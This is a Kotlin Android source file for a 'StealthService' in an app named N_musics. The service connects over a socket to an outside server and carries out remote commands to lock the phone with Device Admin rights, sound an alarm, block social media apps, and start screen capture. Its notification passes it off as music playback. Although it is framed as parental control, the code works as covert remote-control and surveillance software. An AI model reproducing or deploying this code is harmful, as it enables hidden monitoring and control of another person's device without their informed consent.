package com.n.musics.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.media.Ringtone
import android.media.RingtoneManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import com.n.musics.MainActivity
import com.n.musics.admin.MyDeviceAdminReceiver
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject

class StealthService : Service() {

    companion object {
        const val CHANNEL_ID = "N_musics_music_channel"
        const val NOTIFICATION_ID = 101
        const val SERVER_URL = "https://n-musics-backend.onrender.com"
        const val CHILD_UID = "PARENT-IOIY-G05R"
        private const val TAG = "StealthService"
    }

    private var socket: Socket? = null
    private var alarmRingtone: Ringtone? = null
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var componentName: ComponentName

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "🚀 Service created - Connecting to $SERVER_URL")

        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        componentName = ComponentName(applicationContext, MyDeviceAdminReceiver::class.java)

        createNotificationChannel()
        connectToServer()

        Handler(Looper.getMainLooper()).postDelayed({
            requestDeviceAdmin()
        }, 2000)
    }

    private fun requestDeviceAdmin() {
        if (!devicePolicyManager.isAdminActive(componentName)) {
            Log.d(TAG, "⚠️ Device Admin not active - Requesting permission...")
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "N_musics ko lock karne ke liye Device Admin permission chahiye.")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } else {
            Log.d(TAG, "✅ Device Admin already active!")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "📱 Service started")
        val notification = buildNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
        return START_STICKY
    }

    private fun connectToServer() {
        try {
            Log.d(TAG, "🔄 Attempting to connect to server...")

            val opts = IO.Options()
            opts.forceNew = true
            opts.reconnection = true
            opts.reconnectionAttempts = 10
            opts.reconnectionDelay = 1000
            opts.transports = arrayOf("websocket", "polling")

            socket = IO.socket(SERVER_URL, opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d(TAG, "✅✅✅ CONNECTED TO SERVER! ✅✅✅")
                val data = JSONObject()
                data.put("uid", CHILD_UID)
                data.put("battery", 100)
                socket?.emit("child_connect", data)
                Log.d(TAG, "📤 Sent child_connect with UID: $CHILD_UID")
            }

            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
                Log.e(TAG, "❌ Connection ERROR: ${args[0]}")
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.e(TAG, "🔌 Disconnected from server")
            }

            socket?.on("execute_command") { args ->
                try {
                    val data = args[0] as JSONObject
                    val command = data.getString("command")
                    Log.d(TAG, "📩 COMMAND RECEIVED: $command ")

                    when (command) {
                        "ALARM" -> {
                            Log.d(TAG, "🔔 Executing ALARM command...")
                            playLoudAlarm()
                        }
                        "LOCK" -> {
                            Log.d(TAG, " Executing LOCK command...")
                            lockDevice()
                        }
                        "BLOCK_APP" -> {
                            Log.d(TAG, "🚫 Executing BLOCK_APP command...")
                            blockAppsAction()
                        }
                        "START_SCREEN_VIEW" -> {
                            Log.d(TAG, "📸 Executing START_SCREEN_VIEW command...")
                            startScreenView()
                        }
                        "STOP_SCREEN_VIEW" -> {
                            Log.d(TAG, "⏹️ Executing STOP_SCREEN_VIEW command...")
                            stopScreenView()
                        }
                        else -> Log.d(TAG, "❓ Unknown command: $command")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Error parsing command", e)
                }
            }

            socket?.connect()
            Log.d(TAG, "🔄 Socket connect called")

        } catch (e: Exception) {
            Log.e(TAG, "❌❌ CRITICAL ERROR in connectToServer: ${e.message}", e)
            e.printStackTrace()
        }
    }

    private fun playLoudAlarm() {
        Log.d(TAG, "🔔 PLAYING ALARM! 🔔")

        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(5000, VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            vibrator.vibrate(5000)
        }

        try {
            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
            alarmRingtone = RingtoneManager.getRingtone(applicationContext, alarmUri)
            alarmRingtone?.play()
            Log.d(TAG, "🔊 Alarm started playing")

            Handler(Looper.getMainLooper()).postDelayed({
                alarmRingtone?.stop()
                Log.d(TAG, "⏹️ Alarm stopped")
            }, 10000)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error playing alarm", e)
        }
    }

    private fun lockDevice() {
        Log.d(TAG, "🔒 LOCKING DEVICE! 🔒🔒")

        if (devicePolicyManager.isAdminActive(componentName)) {
            Log.d(TAG, "✅ Device Admin active - Locking now!")
            try {
                devicePolicyManager.lockNow()
                Log.d(TAG, "🔐 Device locked successfully!")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error locking device", e)
            }
        } else {
            Log.e(TAG, "❌ Device Admin NOT active! Cannot lock.")
            requestDeviceAdmin()
        }
    }

    private fun blockAppsAction() {
        Log.d(TAG, "🚫 Enabling App Blocker...")
        AppBlockerService.isBlockingEnabled = true
        AppBlockerService.blockedApps.clear()
        AppBlockerService.blockedApps.addAll(listOf(
            "com.whatsapp",
            "com.instagram.android",
            "com.facebook.katana",
            "com.snapchat.android",
            "com.twitter.android",
            "com.google.android.youtube",
            "com.zhiliaoapp.musically"
        ))

        Toast.makeText(this, "Social Media Apps Blocked!", Toast.LENGTH_LONG).show()
    }

    private fun startScreenView() {
        Log.d(TAG, "🎥 Requesting screen capture permission...")
        val intent = Intent(applicationContext, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra("action", "START_SCREEN_CAPTURE")
        }
        startActivity(intent)
    }

    private fun stopScreenView() {
        Log.d(TAG, "⏹️ Stopping screen view")
        val intent = Intent(applicationContext, ScreenCaptureService::class.java)
        stopService(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "💀 Service destroyed")
        alarmRingtone?.stop()
        socket?.disconnect()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Music Playback", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Playing music"
                setShowBadge(false)
            }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
            Log.d(TAG, "📢 Notification channel created")
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("N_musics")
            .setContentText("Connected to parent...")
            .setSmallIcon(android.R.drawable.ic_media_play)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }
}